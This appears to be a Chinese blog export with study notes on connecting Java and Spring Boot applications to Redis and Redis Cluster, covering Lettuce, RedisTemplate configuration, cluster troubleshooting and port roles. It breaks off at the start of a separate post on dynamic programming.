<h4 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h4><h5 id="依赖-1"><a href="#依赖-1" class="headerlink" title="依赖"></a>依赖</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.lettuce<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lettuce-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.3.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="使用-4"><a href="#使用-4" class="headerlink" title="使用"></a>使用</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testLettuce</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 1 使用构建器链式编程来builder我们对redisURI</span></span><br><span class="line">    <span class="type">RedisURI</span> <span class="variable">uri</span> <span class="operator">=</span> RedisURI.builder()</span><br><span class="line">            .redis(<span class="string">&quot;192.168.52.162&quot;</span>)</span><br><span class="line">            .withPort(<span class="number">6381</span>)</span><br><span class="line">            .withAuthentication(<span class="string">&quot;default&quot;</span>,<span class="string">&quot;12345&quot;</span>)</span><br><span class="line">            .build();</span><br><span class="line">    <span class="comment">// 2 创建客户端连接</span></span><br><span class="line">    <span class="comment">// 非集群时</span></span><br><span class="line">    <span class="comment">// RedisClient redisClient = RedisClient.create(uri);</span></span><br><span class="line">    <span class="comment">// StatefulRedisConnection&lt;String, String&gt; connect =redisClient.connect();</span></span><br><span class="line">    <span class="comment">// 集群下，自动重定向</span></span><br><span class="line">    <span class="type">RedisClusterClient</span> <span class="variable">redisClusterClient</span> <span class="operator">=</span> RedisClusterClient.create(uri);</span><br><span class="line">    StatefulRedisClusterConnection&lt;String, String&gt; connect = redisClusterClient.connect();</span><br><span class="line">    <span class="comment">// 3 通过connect创建操作的command</span></span><br><span class="line">    <span class="comment">// RedisCommands&lt;String, String&gt; commands = connect.sync();</span></span><br><span class="line">    RedisAdvancedClusterCommands&lt;String, String&gt; commands = connect.sync();</span><br><span class="line">    <span class="comment">// 4 各种操作</span></span><br><span class="line">    System.out.println(commands.keys(<span class="string">&quot;*&quot;</span>));</span><br><span class="line">    commands.set(<span class="string">&quot;k11&quot;</span>,<span class="string">&quot;helloLettuce&quot;</span>);</span><br><span class="line">    System.out.println(commands.get(<span class="string">&quot;k11&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5 关闭释放资源</span></span><br><span class="line">    connect.close();</span><br><span class="line">    redisClusterClient.shutdown();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h3 id="RedisTemplate驱动包"><a href="#RedisTemplate驱动包" class="headerlink" title="RedisTemplate驱动包"></a><strong>RedisTemplate</strong>驱动包</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a><strong>简介</strong></h4><p><strong>RedisTemplate</strong> 是 Spring Data Redis 提供的一个高级抽象层，封装了底层的 Redis 客户端（如 Jedis 或 Lettuce）。它简化了 Redis 的集成过程，并提供了与 Spring 框架的无缝集成。</p>
<p><strong>特点</strong></p>
<ul>
<li><strong>高度抽象</strong>：屏蔽了底层客户端的具体实现细节。</li>
<li><strong>支持多种序列化方式</strong>：默认使用 <code>JdkSerializationRedisSerializer</code>，也可以自定义为 JSON、String 等格式。</li>
<li><strong>事务支持</strong>：支持 Redis 事务操作。</li>
<li><strong>灵活配置</strong>：可以通过配置文件轻松切换底层客户端（如 Jedis 或 Lettuce）。</li>
</ul>
<p><strong>优点</strong></p>
<ul>
<li>简化开发流程，减少重复代码。</li>
<li>与 Spring 框架深度集成，适合 Spring 生态项目。</li>
<li>提供丰富的扩展性和灵活性。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>性能可能略低于直接使用底层客户端。</li>
<li>对于简单的 Redis 操作，可能存在一定的学习成本。</li>
</ul>
<h4 id="依赖-2"><a href="#依赖-2" class="headerlink" title="依赖"></a>依赖</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--用于在Spring Boot项目中集成Redis，提供操作Redis缓存和数据存储的能力。 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- springboot2.5.x 之前的版本还需要导入</span></span><br><span class="line"><span class="comment"> 	提供对象池功能，常与Redis连接池配合使用，优化连接资源的管理和复用。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-pool2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="单机Redis连接配置"><a href="#单机Redis连接配置" class="headerlink" title="单机Redis连接配置"></a>单机Redis连接配置</h4><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定 Redis 数据库的数据库编号，默认为 0，Redis 支持多个数据库，通过索引区分。</span></span><br><span class="line"><span class="attr">spring.data.redis.database</span>=<span class="string">0</span></span><br><span class="line"><span class="comment"># 配置 Redis 服务器的主机地址，这里是 IP 地址，表示 Redis 服务运行在 192.168.52.162 的机器上。</span></span><br><span class="line"><span class="attr">spring.data.redis.host</span>=<span class="string">192.168.52.162</span></span><br><span class="line"><span class="comment"># 配置 Redis 服务器的端口号，默认 Redis 端口为 6379。</span></span><br><span class="line"><span class="attr">spring.data.redis.port</span>=<span class="string">6379</span></span><br><span class="line"><span class="comment"># 配置 Redis 服务器的连接密码，如果 Redis 未设置密码，则可以留空。</span></span><br><span class="line"><span class="attr">spring.data.redis.password</span>=<span class="string">fsy123</span></span><br><span class="line"><span class="comment"># 配置 Lettuce 连接池的最大活跃连接数，即同时可以有多少个线程使用连接。</span></span><br><span class="line"><span class="attr">spring.data.redis.lettuce.pool.max-active</span>=<span class="string">8</span></span><br><span class="line"><span class="comment"># 配置 Lettuce 连接池中获取连接时的最大等待时间，-1 表示无限期等待（不推荐生产环境使用）。</span></span><br><span class="line"><span class="attr">spring.data.redis.lettuce.pool.max-wait</span>=<span class="string">-1ms</span></span><br><span class="line"><span class="comment"># 配置 Lettuce 连接池中的最大空闲连接数，即连接池中最多可以保持多少个空闲连接。</span></span><br><span class="line"><span class="attr">spring.data.redis.lettuce.pool.max-idle</span>=<span class="string">8</span></span><br><span class="line"><span class="comment"># 配置 Lettuce 连接池中的最小空闲连接数，即连接池中至少需要保持多少个空闲连接。</span></span><br><span class="line"><span class="attr">spring.data.redis.lettuce.pool.min-idle</span>=<span class="string">0</span></span><br></pre></td></tr></table></figure>



<h4 id="集群Redis连接配置"><a href="#集群Redis连接配置" class="headerlink" title="集群Redis连接配置"></a>集群Redis连接配置</h4><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置 Redis 连接信息，用于 Spring Boot 应用与 Redis 集群交互。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># Redis 认证密码，连接 Redis 时需要提供此密码。</span></span><br><span class="line"><span class="comment"># 如果 Redis 未设置密码，可以将此值留空或删除该配置项。</span></span><br><span class="line"><span class="attr">spring.data.redis.password</span>=<span class="string">12345</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># Redis 集群最大重定向次数。</span></span><br><span class="line"><span class="comment"># 当客户端尝试连接集群时，允许的最大重定向次数限制。</span></span><br><span class="line"><span class="comment"># 默认值为 3，通常无需修改。</span></span><br><span class="line"><span class="attr">spring.data.redis.cluster.max-redirects</span>=<span class="string">3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># Lettuce 连接池配置：最大活跃连接数。</span></span><br><span class="line"><span class="comment"># 定义连接池中最多可以同时有多少个活动连接。</span></span><br><span class="line"><span class="comment"># 值为 8 表示最多允许 8 个并发连接。</span></span><br><span class="line"><span class="attr">spring.data.redis.lettuce.pool.max-active</span>=<span class="string">8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># Lettuce 连接池配置：获取连接时的最大等待时间。</span></span><br><span class="line"><span class="comment"># -1ms 表示无限制等待，直到有可用连接为止。</span></span><br><span class="line"><span class="comment"># 如果希望设置超时时间，可以改为正整数值，例如 5000ms。</span></span><br><span class="line"><span class="attr">spring.data.redis.lettuce.pool.max-wait</span>=<span class="string">-1ms</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># Lettuce 连接池配置：最大空闲连接数。</span></span><br><span class="line"><span class="comment"># 定义连接池中最多可以保持多少个空闲连接。</span></span><br><span class="line"><span class="comment"># 值为 8 表示最多允许 8 个空闲连接。</span></span><br><span class="line"><span class="attr">spring.data.redis.lettuce.pool.max-idle</span>=<span class="string">8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># Lettuce 连接池配置：最小空闲连接数。</span></span><br><span class="line"><span class="comment"># 定义连接池中至少需要保持多少个空闲连接。</span></span><br><span class="line"><span class="comment"># 值为 0 表示不强制要求保留空闲连接。</span></span><br><span class="line"><span class="attr">spring.data.redis.lettuce.pool.min-idle</span>=<span class="string">0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># Redis 集群节点地址列表。</span></span><br><span class="line"><span class="comment"># 每个地址由 IP 和端口组成，多个地址之间用逗号分隔。</span></span><br><span class="line"><span class="comment"># 注意：如果地址过长，可以使用反斜杠 `\` 进行换行。</span></span><br><span class="line"><span class="attr">spring.data.redis.cluster.nodes</span>=<span class="string">192.168.52.162:6381,192.168.52.162:6382,\</span></span><br><span class="line"><span class="string">  192.168.52.163:6383,192.168.52.163:6384,\</span></span><br><span class="line"><span class="string">  192.168.52.164:6385,192.168.52.164:6386</span></span><br></pre></td></tr></table></figure>





<h4 id="操作示例"><a href="#操作示例" class="headerlink" title="操作示例"></a>操作示例</h4><p>使用<code>StringRedisTemplate</code>进行相关操作即可</p>
<p><strong>Service层</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ORDER_KEY</span> <span class="operator">=</span> <span class="string">&quot;ord:&quot;</span>;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StringRedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addOrder</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">KeyId</span> <span class="operator">=</span> ThreadLocalRandom.current().nextInt(<span class="number">1000</span>)+<span class="number">1</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">serialNo</span> <span class="operator">=</span> UUID.randomUUID().toString();</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> ORDER_KEY+KeyId;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="string">&quot;订单&quot;</span>+serialNo;</span><br><span class="line"></span><br><span class="line">        redisTemplate.opsForValue().set(key,value);</span><br><span class="line">        log.info(<span class="string">&quot;******key:&#123;&#125;&quot;</span>,key);</span><br><span class="line">        log.info(<span class="string">&quot;******value:&#123;&#125;&quot;</span>,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getOrderById</span><span class="params">(Integer keyId)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> redisTemplate.opsForValue().get(ORDER_KEY+keyId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>Controller层</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Tag(name = &quot;订单接口&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> OrderService orderService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Operation(description = &quot;新增订单&quot;)</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;add&quot;,method = RequestMethod.POST)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addOrder</span><span class="params">()</span>&#123;</span><br><span class="line">        orderService.addOrder();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Operation(description = &quot;按照KeyId查询订单&quot;)</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/get/&#123;keyId&#125;&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getOrderById</span><span class="params">(<span class="meta">@PathVariable</span> Integer keyId)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> orderService.getOrderById(keyId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
<li><p>主从机验证密码应当一致，否则主机宕机后哨兵可能无法访问新主机。</p>
</li>
<li><p>配置主从关系时，主机也需要配置<code>masterauth</code>，否则原主机恢复后无法加入主从关系，，出现<code>master_link_status:down</code>错误。</p>
</li>
<li><p><strong>Redis建议集群节点数量不超过1000</strong>：信息传输可能出现失真；集群节点越多，心跳包的消息体需要携带的数据越多，超过1000会加剧网络拥堵；</p>
</li>
<li><p><strong>为什么REDIS集群的最大槽位是16834</strong>：</p>
</li>
<li><p>REDIS集群不是强一致性的，在特定情况下可能导致数据丢失。</p>
</li>
<li><p><strong>重要！：</strong><code>集群扩容时必须设置防火墙允许新的redis实例的通信端口和集群通信端口的TCP通信！并重启防火墙</code></p>
</li>
</ol>
<h3 id="问题排查"><a href="#问题排查" class="headerlink" title="问题排查"></a>问题排查</h3><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><h5 id="问题1：redis客户端无法显示中文"><a href="#问题1：redis客户端无法显示中文" class="headerlink" title="问题1：redis客户端无法显示中文"></a>问题1：redis客户端无法显示中文</h5><p>【问题概述】<br>在 CentOS 系统中安装的 Redis，启动客户端时发现中文键值显示为类似 <code>\xe8\xae\xa2\xe5\x8d\x95</code> 的转义字符形式，而非正常的中文字符。</p>
<p>【产生原因】  </p>
<p>默认模式下，<code>redis-cli</code> 以协议格式显示数据，会将非 ASCII 字符（如中文）解析为转义序列，便于调试和协议兼容。</p>
<p>【解决方案】<br>使用 <code>redis-cli</code> 的 <code>--raw</code> 模式：以<strong>原始字符串模式</strong>输出数据，直接将 Redis 中存储的二进制数据作为字符串打印，而不进行协议解析或转义字符处理。这种模式下，UTF-8 编码的中文字符不会被转换为十六进制转义序列（如 <code>\xe8\xae\xa2</code>），从而能够正确显示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli --raw</span><br></pre></td></tr></table></figure>
<p>这样可以避免转义字符的显示问题。</p>
<h4 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h4><h5 id="问题1：连接失败的一般原因及解决方案"><a href="#问题1：连接失败的一般原因及解决方案" class="headerlink" title="问题1：连接失败的一般原因及解决方案"></a>问题1：连接失败的一般原因及解决方案</h5><p>原因：所使用的所有端口都需要确保防火墙允许通过：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=6379/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>



<h5 id="问题2：集群建立卡在Waiting-for-the-cluster-to-join"><a href="#问题2：集群建立卡在Waiting-for-the-cluster-to-join" class="headerlink" title="问题2：集群建立卡在Waiting for the cluster to join"></a>问题2：集群建立卡在Waiting for the cluster to join</h5><p><strong>原因</strong>：在 Redis 集群模式下，节点之间通过客户端通信端口+1000的端口进行通信，如上文中通过6381端口进行客户端通信，因此还需要开放16381端口用于集群模式下节点间的内部通信端口。其他节点同理。</p>
<p><strong>解决方案：</strong></p>
<ol>
<li><p><code>CTRL+C</code>中止建立</p>
</li>
<li><p>针对每一个节点所有如下命令清除其加入的集群。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除节点数据，可选</span></span><br><span class="line">redis-cli -h 192.168.52.164 -p 6385 -a 12345 FLUSHALL</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除节点加入的集群</span></span><br><span class="line">redis-cli -h 192.168.52.164 -p 6385 -a 12345 CLUSTER RESET HARD</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用上题命令开放集群节点间的内部通信端口，每个节点只需要开发当前节点对应的通信端口即可</p>
</li>
<li><p>重新使用命令建立集群。</p>
</li>
</ol>
<h5 id="问题3：节点槽位分配失败："><a href="#问题3：节点槽位分配失败：" class="headerlink" title="问题3：节点槽位分配失败："></a>问题3：节点槽位分配失败：</h5><p>存在两种情况：</p>
<p><strong>情况1</strong></p>
<p><strong>问题描述</strong>：</p>
<ol>
<li><p>执行<code>redis-cli -a 12345 --cluster add-node 新节点的IP:Port 旧节点的IP:Port</code>，此时防火墙中新节点的客户端端口和集群通信端口均未开放，<strong>新旧节点IP不同</strong></p>
</li>
<li><p>执行<code>redis-cli -a 12345 --cluster reshard 新节点的IP:Port</code>后，在第四次输入后即出现报错<code>Moving slot 0 from 192.168.52.162:6387 to 192.168.52.162:6390: clusterManagerMoveSlot failed: ERR I don&#39;t know about node a8df52873e65d08db61404451b2069241d3dfaae</code></p>
</li>
<li><p>使用redis-cli -a 12345 –cluster check IP:Port命令查看后，发现当前虚拟机的其他redis实例也没有发现新节点加入到集群</p>
</li>
</ol>
<p><strong>原因</strong>：猜测是端口未开放，导致新节点加入集群时寻找的旧节点根本不知道其加入集群，但新节点又以为自己加入集群了，<strong>实际根本没有加入集群</strong>，后续基本无法修复。</p>
<p><strong>解决方案</strong>：清除新节点相关数据后，开放端口重新操作。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除新节点数据</span></span><br><span class="line">redis-cli -h 192.168.52.162 -p 6390 -a 12345 FLUSHALL</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除新节点加入的集群</span></span><br><span class="line">redis-cli -h 192.168.52.162 -p 6390 -a 12345 CLUSTER RESET HARD</span><br></pre></td></tr></table></figure>



<p><strong>情况2</strong></p>
<p><strong>问题描述</strong>：</p>
<ol>
<li><p>执行<code>redis-cli -a 12345 --cluster add-node 新节点的IP:Port 旧节点的IP:Port</code>，此时防火墙中新节点的客户端端口和集群通信端口均未开放，<strong>新旧节点IP相同</strong>，即在同一虚拟机上</p>
</li>
<li><p>执行<code>redis-cli -a 12345 --cluster reshard 新节点的IP:Port</code>后，正常分配哈希槽</p>
</li>
<li><p>使用redis-cli -a 12345 –cluster check IP:Port命令查看后，发现当前虚拟机的其他redis实例意识到新节点加入到集群，但其他虚拟机的其他redis实例没有意识到新节点加入到集群</p>
</li>
</ol>
<p><strong>原因</strong>：端口未开放，导致新节点加入集群时，其在同一虚拟机寻找旧节点，因此不需要经过防火墙，故而同一虚拟机的旧节点意识到新节点已经加入集群，<strong>实际上新节点也已经加入集群</strong>，但新节点从同机旧节点中获知其他机器的节点后，通知它们时需要经过防火墙，而通知信息被拦截了，导致其他机器中的redis实例没有意识到新成员的加入。</p>
<p><strong>解决方案：</strong>开放端口后，在其他机器使用<code>redis-cli -a 12345 --cluster check IP:port</code>命令重新获取集群状态。</p>
<h5 id="问题4：Node-IP-Port-has-slots-in-importing-state-5461"><a href="#问题4：Node-IP-Port-has-slots-in-importing-state-5461" class="headerlink" title="问题4：Node  IP:Port has slots in importing state 5461."></a>问题4：Node  IP:Port has slots in importing state 5461.</h5><p>原因：出现上述节点槽位分配失败问题后，新节点槽位卡在导入中。</p>
<p>解决方案：<a href="https://stackoverflow.com/questions/77823785/redis-cluster-how-to-fix-has-slots-in-importing-state-the-following-s">参考</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -a password --cluster fix 出错的节点IP:Port</span><br></pre></td></tr></table></figure>



<h4 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h4><h5 id="问题1：Springboot使用RedisTemplate插入键值时出现不明前缀"><a href="#问题1：Springboot使用RedisTemplate插入键值时出现不明前缀" class="headerlink" title="问题1：Springboot使用RedisTemplate插入键值时出现不明前缀"></a>问题1：Springboot使用RedisTemplate插入键值时出现不明前缀</h5><p>问题描述：在没有配置  时，直接向redis插入键值对，键前会出现一些字符，导致按设定的键无法读取。</p>
<p>原因：代码中键（key)和值（value)都是使用Spring提供的Serializer序列化到数据库的，而RedisTemplate默认使用的是JdkSerializationRedisSerializer，JdkSerializationRedisSerializer默认使用的是StringRedisSerializer。两者机制不同，导致存储和读取出现问题。</p>
<p>解决方案：</p>
<ul>
<li>方案1：使用<code>StringRedisTemplate</code>而不是<code>RedisTemplate</code></li>
<li>方案2：在redis配置类中指定序列化方式</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250217175841.png"></p>
<h5 id="问题2：主机宕机从机继位后Springboot2-x程序无法连接Redis"><a href="#问题2：主机宕机从机继位后Springboot2-x程序无法连接Redis" class="headerlink" title="问题2：主机宕机从机继位后Springboot2.x程序无法连接Redis"></a>问题2：主机宕机从机继位后Springboot2.x程序无法连接Redis</h5><p>【<strong>问题描述</strong>】 </p>
<p>在 Redis 集群架构中，当主机宕机后，从机晋升为主机，在redis客户端中可正常读写，但Java 程序在主从切换完成后无法连接到新的 Redis 主机。</p>
<p>【<strong>原因</strong>】</p>
<p>微服务项目由于网络抖动缺失数据，Springboot客户端没有动态感知到RedisCluster的最新集群信息。SpringBoot2.x版本下redis默认使用Lettuce连接池，当Redis集群节点发生变化后，Lettuce默认不会刷新节点拓扑。<strong>学习过程中发现部分人说SpringBoot3不会出现此问题（推测他们可能重新运行Java程序了)，但笔者的笔记环境下Redis7.0.15+SpringBoot3.0.5出现了此问题，拓扑不会自动更新</strong></p>
<p>【<strong>解决方案</strong>】</p>
<p>可以使用Jedis或重写连接工厂实例（不建议）。从<code>Spring Boot 2.3.0</code>开始，官方引入了对Redis集群拓扑动态刷新的支持，<a href="https://github.com/redis/lettuce/wiki/Redis-Cluster#user-content-refreshing-the-cluster-topology-view">详情</a>。因此可以有两种方法解决此问题:</p>
<ul>
<li><p>方法一：主动调用</p>
</li>
<li><p>方法2：通过配置启用集群拓扑动态刷新，使得客户端能够在检测到集群拓扑变化时自动更新其内部的拓扑视图。</p>
</li>
</ul>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Lettuce Redis 集群连接的动态刷新配置</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># 启用自适应集群拓扑刷新功能。</span></span><br><span class="line"><span class="comment"># 当设置为 true 时，Lettuce 客户端会在检测到集群拓扑变化（如节点新增、移除或主从切换）时，</span></span><br><span class="line"><span class="comment"># 自动触发拓扑刷新操作，以确保客户端能够及时感知最新的集群状态。</span></span><br><span class="line"><span class="comment"># 默认值为 true，建议在生产环境中保持启用。</span></span><br><span class="line"><span class="attr">spring.data.redis.lettuce.cluster.refresh.adaptive</span>=<span class="string">true</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># 设置集群拓扑定期刷新的时间间隔（毫秒）。</span></span><br><span class="line"><span class="comment"># 定义 Lettuce 客户端每隔多久主动检查一次集群拓扑是否有变化。</span></span><br><span class="line"><span class="comment"># 值为 2000 表示每 2 秒执行一次定期刷新检查。</span></span><br><span class="line"><span class="comment"># 如果设置为 -1，则禁用定期刷新功能。</span></span><br><span class="line"><span class="comment"># 注意：频繁的刷新可能会增加网络开销，应根据实际场景调整该值。</span></span><br><span class="line"><span class="attr">spring.data.redis.lettuce.cluster.refresh.period</span>=<span class="string">2000</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># 还有一个类似配置，不要混淆奥 </span></span><br><span class="line"><span class="comment"># spring.data.redis.lettuce.cluster.refresh.dynamic-refresh-sources=true </span></span><br><span class="line"><span class="comment"># 客户端从外部数据源（如 Sentinel）获取最新的集群节点信息，并动态更新连接池中的节点列表。它不依赖客户端的主动检测，而是被动接收外部通知。</span></span><br></pre></td></tr></table></figure>



<p>对于Spring Boot 2.0至2.2版本，默认使用的Redis客户端是Lettuce，并且这些版本并不支持通过属性配置的方式开启集群拓扑刷新。因此，需要手动配置Lettuce连接工厂以实现这一目的。可以通过创建自定义的<code>LettuceConnectionFactory</code> Bean来完成此操作。</p>
<h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><h4 id="Redis-端口-6379、16379-和-26379-的用途"><a href="#Redis-端口-6379、16379-和-26379-的用途" class="headerlink" title="Redis 端口 6379、16379 和 26379 的用途"></a>Redis 端口 6379、16379 和 26379 的用途</h4><p>在 Redis 中，以下三个端口分别有不同的用途：</p>
<ol>
<li><p><strong>6379</strong>  </p>
<ul>
<li><strong>默认的客户端通信端口</strong>：这是 Redis 默认用于处理客户端请求的端口。所有普通的读写操作、管理命令等都通过此端口进行。</li>
<li>客户端通过该端口与 Redis 实例交互。</li>
</ul>
</li>
<li><p><strong>16379</strong>  </p>
<ul>
<li><strong>集群内部通信端口</strong>：在 Redis 集群模式下，节点之间通过此端口进行通信（Cluster Bus）。  </li>
<li>节点间使用二进制协议交换状态信息、槽分配情况以及故障检测等数据。</li>
<li>如果未启用集群模式，则该端口通常不会被使用。</li>
</ul>
</li>
<li><p><strong>26379</strong>  </p>
<ul>
<li><strong>哨兵模式通信端口</strong>：Redis 哨兵（Sentinel）进程使用此端口监听和监控主从节点的状态。</li>
<li>哨兵之间以及哨兵与 Redis 节点之间的通信通过该端口完成。</li>
<li>哨兵机制依赖此端口实现高可用性功能，如故障检测和自动故障转移。</li>
</ul>
</li>
</ol>
<hr>
<p>总结  </p>
<ul>
<li><strong>6379</strong>：客户端与 Redis 服务交互的默认端口。</li>
<li><strong>16379</strong>：集群模式下节点间的内部通信端口。</li>
<li><strong>26379</strong>：哨兵模式下监控和管理的专用端口。</li>
</ul>
]]></content>
      <categories>
        <category>缓存与数据库</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>算法-动态规划</title>
    <url>/2024/08/30/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
    <content><![CDATA[<p><strong>如果一个问题是由多个重叠的子问题组成</strong></p>
<h2 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h2><p>动态规划中每一个状态一定是由上一个状态推导出来的（与贪心的区别）<br>动规是由前一个状态推导出来的，而贪心是局部直接选最优的。</p>
<p>步骤：</p>
<ol>
<li>确定dp数组（dp table）以及下标的含义</li>
<li>确定递推公式（状态转移公式）<code>递推公式决定了dp数组要如何初始化！</code></li>
<li>dp数组如何初始化</li>
<li>确定遍历顺序</li>
<li>举例推导dp数组</li>
</ol>
<p>这道题目我举例推导状态转移公式了么？<br>我打印dp数组的日志了么？<br>打印出来了dp数组和我想的一样么？</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-%E6%80%BB%E7%BB%93%E5%A4%A7%E7%BA%B21.jpg" alt="动态规划重要题目"></p>
<h2 id="重要例题"><a href="#重要例题" class="headerlink" title="重要例题"></a>重要例题</h2><h3 id="509-斐波那契数"><a href="#509-斐波那契数" class="headerlink" title="509 斐波那契数"></a>509 斐波那契数</h3><p>斐波那契数 （通常用 F(n) 表示）形成的序列称为 斐波那契数列 。该数列由 0 和 1 开始，后面的每一项数字都是前面两项数字的和。也就是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">F(<span class="number">0</span>) = <span class="number">0</span>，F(<span class="number">1</span>) = <span class="number">1</span></span><br><span class="line">F(n) = F(n - <span class="number">1</span>) + F(n - <span class="number">2</span>)，其中 n &gt; <span class="number">1</span></span><br></pre></td></tr></table></figure>
